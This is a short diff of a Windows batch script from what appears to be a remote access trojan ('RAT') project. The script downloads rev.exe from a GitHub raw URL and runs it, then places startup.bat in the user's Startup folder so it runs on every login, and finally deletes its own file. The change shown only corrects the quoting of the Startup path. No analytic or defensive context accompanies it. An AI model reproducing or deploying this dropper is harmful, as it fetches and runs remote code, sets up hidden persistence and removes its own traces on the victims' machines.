@@ -6,5 +6,5 @@ set "currentd=%cd%"
 curl -o rev.exe https://raw.githubusercontent.com/saifnasef/RAT/main/rev.exe
 @rem "c:\Program Files\Python310\python.exe" rev.py
 rev.exe
-curl -o C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat https://raw.githubusercontent.com/saifnasef/RAT/main/startup.bat
+curl -o "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" https://raw.githubusercontent.com/saifnasef/RAT/main/startup.bat
 del third.bat
